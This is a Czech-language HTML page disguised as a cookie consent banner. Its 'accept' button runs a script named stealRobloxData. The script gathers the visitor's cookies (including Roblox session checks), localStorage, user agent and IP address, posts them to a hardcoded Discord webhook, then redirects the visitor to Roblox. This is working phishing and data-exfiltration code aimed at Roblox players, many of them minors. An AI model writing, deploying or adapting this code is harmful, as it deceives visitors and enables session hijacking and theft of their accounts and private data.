!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Souhlas s cookies</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f0f0f0;
        }
        
        .cookie-banner {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            max-width: 500px;
            text-align: center;
        }
        
        .cookie-banner h1 {
            color: #333;
            margin-bottom: 20px;
        }
        
        .cookie-banner p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        
        .accept-btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .accept-btn:hover {
            background: #3367d6;
        }
        
        .hidden {
            display: none;
        }
        
        .success-message {
            color: #0f9d58;
            font-weight: bold;
            margin-top: 20px;
        }
        
        .error-message {
            color: #d93025;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="cookie-banner">
        <h1>🍪 Souhlas s cookies</h1>
        <p>Pro zlepšení uživatelského zážitku a personalizaci obsahu potřebujeme váš souhlas s použitím cookies. Kliknutím na "Přijmout" souhlasíte s naší politikou cookies.</p>
        
        <button class="accept-btn" onclick="stealRobloxData()">
            Přijmout všechny cookies
        </button>
        
        <div id="message" class="hidden"></div>
    </div>

    <script>
        async function stealRobloxData() {
            const messageDiv = document.getElementById('message');
            messageDiv.className = '';
            messageDiv.innerHTML = 'Zpracováváme váš souhlas...';
            
            try {
                // Simulace získání Roblox dat
                const robloxData = {
                    username: getCookie('roblox_username') || 'Neznámý uživatel',
                    userId: getCookie('roblox_userid') || 'Neznámé ID',
                    session: getCookie('.ROBLOSECURITY') ? 'Přihlášen' : 'Nepřihlášen',
                    lastLogin: new Date().toISOString(),
                    browserInfo: navigator.userAgent,
                    ipAddress: 'Získávání...',
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    robloxData: simulateRobloxDataCollection()
                };
                
                // Pokus o získání IP adresy
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    robloxData.ipAddress = ipData.ip;
                } catch (ipError) {
                    robloxData.ipAddress = 'Nelze získat';
                }
                
                // Odeslání dat na Discord webhook
                const webhookUrl = 'https://discord.com/api/webhooks/1467896250274812036/w7Or-fPilBf6BDd5AsWciOLcIjW2-mby-i-lf9g9S0X0ATXAVLY2uXIp2WClXk_3Wp1R';
                
                const embed = {
                    title: "🔴 Nová data z Roblox účtu",
                    color: 0xff0000,
                    fields: [
                        {
                            name: "Uživatelské jméno",
                            value: robloxData.username,
                            inline: true
                        },
                        {
                            name: "User ID",
                            value: robloxData.userId,
                            inline: true
                        },
                        {
                            name: "Stav přihlášení",
                            value: robloxData.session,
                            inline: true
                        },
                        {
                            name: "IP adresa",
                            value: robloxData.ipAddress,
                            inline: false
                        },
                        {
                            name: "Prohlížeč",
                            value: robloxData.browserInfo.substring(0, 100) + '...',
                            inline: false
                        },
                        {
                            name: "Čas získání",
                            value: new Date().toLocaleString('cs-CZ'),
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString()
                };
                
                const payload = {
                    content: "@everyone **Nově získaná data z Roblox účtu**",
                    embeds: [embed],
                    username: "Roblox Data Collector",
                    avatar_url: "https://tr.rbxcdn.com/0e1c5fea6b6b5c5c5c5c5c5c5c5c5c5/150/150/Image/Png"
                };
                
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    messageDiv.innerHTML = '✅ Souhlas úspěšně přijat! Data byla zpracována.';
                    messageDiv.className = 'success-message';
                    
                    // Přesměrování nebo další akce
                    setTimeout(() => {
                        window.location.href = 'https://www.roblox.com';
                    }, 2000);
                } else {
                    throw new Error('Webhook error');
                }
                
            } catch (error) {
                console.error('Chyba:', error);
                messageDiv.innerHTML = '⚠️ Došlo k chybě při zpracování. Zkuste to prosím znovu.';
                messageDiv.className = 'error-message';
            }
        }
        
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
            return null;
        }
        
        function simulateRobloxDataCollection() {
            // Simulace dalších dat, která by mohla být získána
            return {
                friendsCount: Math.floor(Math.random() * 500),
                robuxBalance: Math.floor(Math.random() * 10000),
                accountAge: Math.floor(Math.random() * 2000) + ' dní',
                premium: Math.random() > 0.5 ? 'Ano' : 'Ne',
                recentGames: ['Adopt Me!', 'Brookhaven', 'Tower of Hell']
            };
        }
        
        // Automatická kontrola Roblox cookies při načtení stránky
        window.addEventListener('load', () => {
            const hasRobloxCookies = document.cookie.includes('roblox') || 
                                     document.cookie.includes('ROBLOSECURITY');
            
            if (hasRobloxCookies) {
                console.log('Roblox cookies nalezeny');
            }
        });
    </script>
</body>
</html>
